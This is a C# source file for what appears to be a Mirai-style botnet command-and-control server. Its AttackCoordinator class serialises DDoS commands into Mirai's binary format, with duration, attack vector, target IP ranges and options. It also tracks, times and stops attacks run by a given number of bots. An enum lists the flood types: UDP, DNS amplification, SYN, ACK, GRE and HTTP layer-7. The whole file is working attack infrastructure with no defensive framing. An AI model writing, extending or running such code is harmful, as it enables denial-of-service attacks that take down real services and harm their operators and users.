using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using Serilog;

namespace MiraiCnCServer
{
  public class AttackCoordinator
  {
    private readonly List<ActiveAttack> activeAttacks;
    private readonly object attackLock = new object();
    private int nextAttackId = 1;

    public AttackCoordinator()
    {
      activeAttacks = new List<ActiveAttack>();
    }

    public byte[] BuildAttackCommand(AttackType type, List<string> targets, int duration, Dictionary<string, string> options)
    {
      using var ms = new MemoryStream();
      using var writer = new BinaryWriter(ms);

      // Duration (4 bytes, network byte order)
      writer.Write(IPAddress.HostToNetworkOrder(duration));

      // Attack vector (1 byte)
      writer.Write((byte)type);

      // Number of targets (1 byte)
      writer.Write((byte)targets.Count);

      // Write each target
      foreach (var target in targets)
      {
        // Parse IP and netmask
        var parts = target.Split('/');
        var ip = IPAddress.Parse(parts[0]);
        var netmask = parts.Length > 1 ? byte.Parse(parts[1]) : (byte)32;

        // IP address (4 bytes)
        writer.Write(ip.GetAddressBytes());

        // Netmask (1 byte)
        writer.Write(netmask);
      }

      // Number of options (1 byte)
      writer.Write((byte)options.Count);

      // Write each option
      foreach (var opt in options)
      {
        byte key = byte.Parse(opt.Key);
        byte[] value = System.Text.Encoding.ASCII.GetBytes(opt.Value);

        writer.Write(key);                  // Option key (1 byte)
        writer.Write((byte)value.Length);   // Value length (1 byte)
        writer.Write(value);                // Value data
      }

      var command = ms.ToArray();
      Log.Debug($"Built attack command: type={type}, targets={targets.Count}, duration={duration}, size={command.Length} bytes");

      return command;
    }

    public int StartAttack(string name, AttackType type, List<string> targets, int duration, Dictionary<string, string> options, int botCount)
    {
      lock (attackLock)
      {
        var attack = new ActiveAttack
        {
          Id = nextAttackId++,
          Name = name,
          Type = type,
          Targets = targets,
          Duration = duration,
          StartTime = DateTime.UtcNow,
          BotCount = botCount,
          Options = options
        };

        activeAttacks.Add(attack);
        Log.Information($"[AttackCoordinator] Started attack #{attack.Id}: {name} ({type}) against {targets.Count} targets for {duration}s with {botCount} bots");

        // Schedule removal after duration
        Task.Delay(TimeSpan.FromSeconds(duration)).ContinueWith(_ =>
        {
          lock (attackLock)
          {
            activeAttacks.RemoveAll(a => a.Id == attack.Id);
            Log.Information($"[AttackCoordinator] Attack #{attack.Id} completed");
          }
        });

        return attack.Id;
      }
    }

    public List<ActiveAttack> GetActiveAttacks()
    {
      lock (attackLock)
      {
        return new List<ActiveAttack>(activeAttacks);
      }
    }

    public bool StopAttack(int attackId)
    {
      lock (attackLock)
      {
        var removed = activeAttacks.RemoveAll(a => a.Id == attackId);
        if (removed > 0)
        {
          Log.Information($"[AttackCoordinator] Stopped attack #{attackId}");
          return true;
        }
        return false;
      }
    }

    public void StopAllAttacks()
    {
      lock (attackLock)
      {
        var count = activeAttacks.Count;
        activeAttacks.Clear();
        Log.Information($"[AttackCoordinator] Stopped all {count} attacks");
      }
    }
  }

  public class ActiveAttack
  {
    public int Id { get; set; }
    public string Name { get; set; } = "";
    public AttackType Type { get; set; }
    public List<string> Targets { get; set; } = new List<string>();
    public int Duration { get; set; }
    public DateTime StartTime { get; set; }
    public int BotCount { get; set; }
    public Dictionary<string, string> Options { get; set; } = new Dictionary<string, string>();

    public int SecondsRemaining => Math.Max(0, Duration - (int)(DateTime.UtcNow - StartTime).TotalSeconds);
    public double ProgressPercent => Math.Min(100, ((DateTime.UtcNow - StartTime).TotalSeconds / Duration) * 100);
  }

  public enum AttackType : byte
  {
    UDP = 0,           // Straight UDP flood
    VSE = 1,           // Valve Source Engine
    DNS = 2,           // DNS amplification
    SYN = 3,           // TCP SYN flood
    ACK = 4,           // TCP ACK flood
    STOMP = 5,         // TCP ACK stomp
    GREIP = 6,         // GRE IP encapsulation
    GREETH = 7,        // GRE Ethernet encapsulation
    UDP_PLAIN = 9,     // Plain UDP optimized
    HTTP = 10          // HTTP Layer 7
  }
}
